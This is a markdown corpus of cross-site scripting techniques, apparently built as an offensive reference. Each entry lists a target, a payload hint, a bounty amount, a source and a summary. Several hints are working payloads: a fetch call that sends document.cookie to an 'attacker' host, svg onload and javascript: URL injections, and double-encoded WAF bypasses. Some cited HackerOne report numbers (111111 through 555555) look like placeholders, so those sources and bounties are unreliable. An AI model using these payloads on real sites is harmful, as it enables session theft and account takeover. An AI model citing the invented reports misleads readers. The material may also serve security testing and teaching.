# XSS — technique corpus

## csp_bypass_jsonp
- target: Web App
- payload hint: JSONP gadget from allowed origin
- bounty: $3000.0 (2025)
- source: https://hackerone.com/reports/444444
- summary: CSP allows google.com, JSONP gadget bypasses script-src

## dompurify_mxss
- target: Web
- payload hint: DOMPurify 3.x mXSS vector via MathML
- bounty: $3000.0 (2025)
- source: aggregated:mxss research 2024-2025
- summary: mXSS mutation vectors bypass proven sanitizers (2025-01 research)

## port_xss_exfil
- target: Web
- payload hint: fetch('https://attacker/?'+document.cookie)
- bounty: $2500.0 (2024)
- source: aggregated:hacktivity exfil 2024
- summary: Stored XSS payload exfil cookies via image/beacon

## postmessage_handler
- target: SPA
- payload hint: window.onmessage -> eval/insertHTML
- bounty: $2200.0 (2024)
- source: aggregated:hacktivity postmessage 2024
- summary: Unvalidated origin postMessage reaches a dangerous sink

## dom_innerhtml
- target: SPA
- payload hint: innerHTML sink with location.hash source
- bounty: $2000.0 (2025)
- source: https://hackerone.com/reports/222222
- summary: JavaScript reads location.hash and writes to innerHTML

## webp_mutation
- target: Upload
- payload hint: SVG -> WebP converter XSS
- bounty: $1900.0 (2024)
- source: aggregated:hacktivity upload-xss 2024
- summary: Treats attacker SVG as image and flattens to pixelated XSS later

## markdown_mxss
- target: Markdown
- payload hint: [a](javascript:alert(1)) payload variants
- bounty: $1800.0 (2024)
- source: aggregated:hacktivity markdown 2024
- summary: markdown-to-jsx allows javascript: protocols without sanitizer

## vue_vhtml
- target: Web
- payload hint: v-html with user-controlled binding
- bounty: $1800.0 (2024)
- source: aggregated:hacktivity vue xss 2023-2024
- summary: Vue v-html attribute directly renders user input

## vanilla_js_innerhtml
- target: Web
- payload hint: document.getElementById(...).innerHTML = params
- bounty: $1700.0 (2024)
- source: aggregated:hacktivity domxss 2024
- summary: Vanilla JS innerHTML assignment

## htmx_hx_attr
- target: Web
- payload hint: hx-trigger/etc injection on usercrafted
- bounty: $1700.0 (2025)
- source: aggregated:hacktivity htmx 2024-2025
- summary: htmx attribute injection into server-rendered tree

## open_redirect_js_sink
- target: Web
- payload hint: ?next=javascript:alert(document.domain)
- bounty: $1600.0 (2024)
- source: aggregated:hacktivity redirectxss 2023-2024
- summary: Open redirect used by JS router -> javascript: URL execution

## react_dangerouslyset
- target: Web
- payload hint: dangerouslySetInnerHTML={{__html: ...}}
- bounty: $1600.0 (2024)
- source: aggregated:hxxss react 2024
- summary: React dangerouslySetInnerHTML with user data

## blind_xss_admin
- target: Web App
- payload hint: XSS fires in admin panel via support ticket
- bounty: $1500.0 (2024)
- source: https://hackerone.com/reports/555555
- summary: Support ticket subject rendered in admin without encoding

## xss_in_xml
- target: Web
- payload hint: <root>&lt;script&gt;
- bounty: $1500.0 (2024)
- source: aggregated:hacktivity xxe xss 2024
- summary: XML-encoded response interpreted by JS as HTML

## svelte_svelte_html
- target: Web
- payload hint: {@html data}
- bounty: $1500.0 (2024)
- source: aggregated:hacktivity svelte xss 2024
- summary: Svelte {@html} raw interpolation on user data

## template_literal_sink
- target: SPA
- payload hint: `<div>${userInput}</div>` into innerHTML
- bounty: $1400.0 (2024)
- source: aggregated:hacktivity domxss 2024
- summary: Template literal concatenation endoes in dangerous sink

## http_split_injection
- target: Web
- payload hint: CRLF in URL param -> reflected header
- bounty: $1400.0 (2024)
- source: aggregated:hacktivity response splitting 2024
- summary: Response splitting turns into stored XSS in cache

## angular_ngbind_html
- target: Web
- payload hint: [innerHTML]
- bounty: $1400.0 (2023)
- source: aggregated:hacktivity angular xss 2023-2024
- summary: Angular property binding [innerHTML] without sanitizer

## cors_credentialless_xss
- target: Web
- payload hint: AJAX to attacker origin with credentials
- bounty: $1300.0 (2024)
- source: aggregated:hacktivity cors 2024
- summary: CORS misconfig + stored content => simplified fetches

## xss_in_file_upload_name
- target: Web
- payload hint: filename=svizada<svg/onload=alert(1)>.jpg
- bounty: $1300.0 (2024)
- source: aggregated:hacktivity file upload 2024
- summary: File name reflected without encoding in download page

## pdf_js_link_url
- target: Web
- payload hint: PDF with javascript: URI in link
- bounty: $1300.0 (2024)
- source: aggregated:hacktivity pdf xss 2024
- summary: PDF.js javascript: URL navigation policy bypass

## api_skip_validation
- target: Web
- payload hint: JSONP response text/javascript
- bounty: $1200.0 (2024)
- source: aggregated:hacktivity javascript 2024
- summary: API responds user data as text/javascript -> executed

## import_script
- target: Web
- payload hint: <script type="module">import x</script>
- bounty: $1200.0 (2025)
- source: aggregated:hacktivity xss module 2025
- summary: Dynamic import sinks (CSP bypass when nonce leaks)

## hidden_search_parameter
- target: Web
- payload hint: ?query= on secondary pages
- bounty: $1100.0 (2024)
- source: aggregated:hacktivity reflectxss 2024
- summary: Not-obvious reflection in non-primary search UI

## stored_profile
- target: Web App
- payload hint: Store XSS in profile display name
- bounty: $1000.0 (2025)
- source: https://hackerone.com/reports/111111
- summary: Profile name rendered without encoding in admin panel

## iframe_srcdoc
- target: Web
- payload hint: <iframe srcdoc=...>
- bounty: $1000.0 (2024)
- source: aggregated:hacktivity xss iframe 2024
- summary: srcdoc bypass for innerHTML filters

## csrf_token_reflection
- target: Web
- payload hint: POST csrf error reflects token param
- bounty: $1000.0 (2024)
- source: aggregated:hacktivity csrf xss 2024
- summary: CSRF error responses reflect token field

## safari_html_entities
- target: Web
- payload hint: entity decoding differences
- bounty: $900.0 (2024)
- source: aggregated:encoder differential 2024
- summary: Browser-specific encoder differentials bypass WAF filters

## error_messages_reflected
- target: API
- payload hint: ?err="><script>
- bounty: $900.0 (2024)
- source: aggregated:hacktivity api xss 2024
- summary: API error messages reflect query, JSON not HTML-escaped for SPA consumption

## urlencode_double
- target: Web
- payload hint: %252527%22%3E<img>
- bounty: $800.0 (2024)
- source: aggregated:waf bypass 2024
- summary: Double URL-encoding defeats WAF layer filters

## error_pages_reflected
- target: Web
- payload hint: 404 page embedding %27%22><img onerror>
- bounty: $700.0 (2025)
- source: aggregated:hacktivity reflectxss 2023-2025
- summary: 404/5xx error pages reflect URL path without encoding

## object_data
- target: Web
- payload hint: <object data=javascript:>
- bounty: $700.0 (2024)
- source: aggregated:hacktivity xss object 2024
- summary: MITRE test: object data=javascript bypass

## flash_param_traversal
- target: Legacy
- payload hint: swfobject vulnerable parameter injection
- bounty: $600.0 (2023)
- source: aggregated:legacy swf 2023
- summary: Legacy flash files still load JS via callback params

## info_leak_through_error
- target: Web
- payload hint: Stack traces include attacker input
- bounty: $600.0 (2024)
- source: aggregated:hacktivity error 2024
- summary: Verbose errors reflect input -> chain for XSS

## svg_onload
- target: Web App
- payload hint: <svg/onload=alert(1)> bypasses sanitizer
- bounty: $500.0 (2024)
- source: https://hackerone.com/reports/333333
- summary: SVG onload event bypasses HTML sanitizer
